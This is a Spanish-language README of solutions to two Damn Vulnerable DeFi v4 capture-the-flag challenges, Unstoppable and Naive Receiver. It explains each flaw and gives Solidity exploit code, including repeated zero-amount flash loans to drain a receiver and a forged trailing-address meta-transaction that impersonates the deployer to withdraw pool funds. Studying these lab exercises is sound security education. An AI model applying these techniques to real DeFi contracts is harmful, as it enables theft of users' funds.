# Damn Vulnerable DeFi v4 - Soluciones

Este repositorio contiene mis soluciones para los challenges de **Damn Vulnerable DeFi v4**, una plataforma educativa de seguridad de smart contracts.

## Descripción

Damn Vulnerable DeFi es el playground de seguridad de smart contracts más sofisticado para desarrolladores, investigadores de seguridad y educadores. Contiene contratos intencionalmente vulnerables que cubren flashloans, price oracles, governance, NFTs, DEXs, lending pools, smart contract wallets, timelocks, vaults, meta-transacciones, distribuciones de tokens, upgradeability y más.

## Challenges Resueltos

### Challenge 1 - Unstoppable

El challenge consiste en detener el contrato `UnstoppableVault`, que ofrece flash loans gratis hasta que termine un período de gracia. El objetivo es hacer que el vault deje de ofrecer flash loans explotando una vulnerabilidad en el sistema.

#### Vulnerabilidad

La vulnerabilidad está en la función `flashLoan` del contrato `UnstoppableVault`. Específicamente, la función verifica si los activos totales en el vault coinciden con el supply total de shares antes de proceder con el flash loan. Si esta condición no se cumple, el flash loan fallará.

#### Explotación

Para explotar esta vulnerabilidad, puedes transferir una pequeña cantidad del token del vault directamente al vault. Esta acción hará que el balance de tokens del vault aumente sin acuñar nuevos shares, rompiendo así la invariante de que los activos totales deben ser iguales al supply total de shares. Como resultado, cualquier intento posterior de flash loan fallará, activando el contrato `UnstoppableMonitor` para pausar el vault y transferir la propiedad de vuelta al deployer.

#### Código de Explotación

En el contrato `UnstoppableChallenge`, la función `test_unstoppable` demuestra esta explotación:

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

Esta función transfiere 1 token al vault, causando que la invariante del flash loan se rompa y deteniendo el vault.

### Challenge 2 - Naive Receiver

El challenge involucra un sistema de smart contracts con un pool de flash loans (`NaiveReceiverPool`) y un receptor de flash loans (`FlashLoanReceiver`). El pool tiene una tarifa fija para los flash loans y soporta meta-transacciones a través de un contrato `BasicForwarder`. El objetivo es drenar todo el WETH tanto del pool como del receptor y depositarlo en una cuenta de recovery designada.

#### Descripción General de los Contratos

1. **NaiveReceiverPool**: Este contrato ofrece flash loans con una tarifa fija de 1 WETH. Soporta meta-transacciones a través del contrato `BasicForwarder`.
2. **FlashLoanReceiver**: Este contrato recibe flash loans del `NaiveReceiverPool` y se espera que repague el préstamo más la tarifa.
3. **BasicForwarder**: Este contrato permite meta-transacciones, permitiendo a los usuarios agrupar múltiples llamadas en una sola transacción.
4. **Multicall**: Este contrato permite que múltiples llamadas de función se ejecuten en una sola transacción.

#### Desglose de la Vulnerabilidad

La vulnerabilidad está en la función `flashLoan` del contrato `NaiveReceiverPool`. La función permite que cualquiera la llame repetidamente, causando que el `FlashLoanReceiver` pague la tarifa fija cada vez. Esto puede ser explotado para drenar el balance del receptor al iniciar repetidamente flash loans con cantidad cero, pero aún incurriendo en la tarifa fija.

#### Implementación del Exploit

1. **Flash Loans Repetidos**: El atacante llama repetidamente a la función `flashLoan` con cantidad cero, causando que el `FlashLoanReceiver` pague la tarifa fija cada vez. Esto drena el balance del receptor que se transfiere al pool.
2. **Ejecución de Meta-Transacción**: El atacante usa el `BasicForwarder` para ejecutar una serie de llamadas de flash loan y una llamada final de withdrawal en una sola transacción. Explotamos aquí el problema de control de acceso dentro del contrato del pool que confía ciegamente en los últimos 20 bytes de los datos del mensaje para determinar quién es el remitente de la llamada, al crear datos de mensaje maliciosos podemos hacer que el pool crea que somos el deployer del pool y acceder a todos sus fondos depositados.

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {

    // Preparar datos de llamada para 10 flash loans y 1 withdrawal
    bytes[] memory callDatas = new bytes[](11);

    // Codificar llamadas de flash loan - en nombre del receptor Naive
    for (uint i = 0; i < 10; i++) {
        callDatas[i] = abi.encodeCall(
        NaiveReceiverPool.flashLoan,
        (receiver, address(weth), 0, "0x")
        );
    }

    // Codificar llamada de withdrawal
    // Explotar la vulnerabilidad de control de acceso pasando la request a través del forwarder
    // Y estableciendo el deployer como remitente en los últimos 20 bytes (Así es como el pool lo parsea)
    callDatas[10] = abi.encodePacked(
        abi.encodeCall(
        NaiveReceiverPool.withdraw,
        (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ),
        bytes32(uint256(uint160(deployer)))
    );

    // Codificar el multicall
    bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

    // Crear request del forwarder
    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        gasleft(),
        forwarder.nonces(player),
        multicallData,
        1 days
    );

    // Hashear la request
    bytes32 requestHash = keccak256(
        abi.encodePacked(
        "\x19\x01",
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)
        )
    );

    // Firmar la request
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);

    // Ejecutar la request
    forwarder.execute(request, signature);
}
```

#### Explicación del Exploit

1. **Preparar Llamadas de Flash Loan**: El exploit prepara 10 llamadas de flash loan con cantidad cero, que drenarán el balance del receptor al incurrir repetidamente en la tarifa fija.
2. **Preparar Llamada de Withdrawal**: El exploit prepara una llamada final de withdrawal para transferir todo el WETH del pool y del receptor a la cuenta de recovery. Establecemos la dirección del deployer como los últimos 20 bytes para que el pool piense que el deployer es el remitente.
3. **Codificar Multicall**: El exploit codifica las llamadas de flash loan y la llamada de withdrawal en un solo multicall.
4. **Crear Request del Forwarder**: El exploit crea una request del forwarder con el multicall codificado.
5. **Firmar la Request**: El exploit firma la request del forwarder usando la clave privada del player.
6. **Ejecutar la Request**: El exploit ejecuta la request del forwarder, drenando el balance del receptor y transfiriendo todo el WETH a la cuenta de recovery.

## Instalación y Uso

1. Clona el repositorio
2. Instala Foundry: `curl -L https://foundry.paradigm.xyz | bash`
3. Ejecuta `forge build` para compilar
4. Ejecuta los tests: `forge test --mp test/<challenge>/<ChallengeName>.t.sol`

## Estructura del Proyecto

- `src/` - Contratos de los challenges
- `test/` - Tests de Foundry con las soluciones
- `lib/` - Dependencias (OpenZeppelin, Uniswap, Safe, etc.)

## Disclaimer

⚠️ **ADVERTENCIA**: Todo el código en este repositorio es INTENCIONALMENTE VULNERABLE y solo para propósitos educativos. NO USAR EN PRODUCCIÓN.

## Recursos

- [Damn Vulnerable DeFi](https://damnvulnerabledefi.xyz)
- [Foundry Book](https://book.getfoundry.sh/)
- [OpenZeppelin Contracts](https://docs.openzeppelin.com/contracts/)
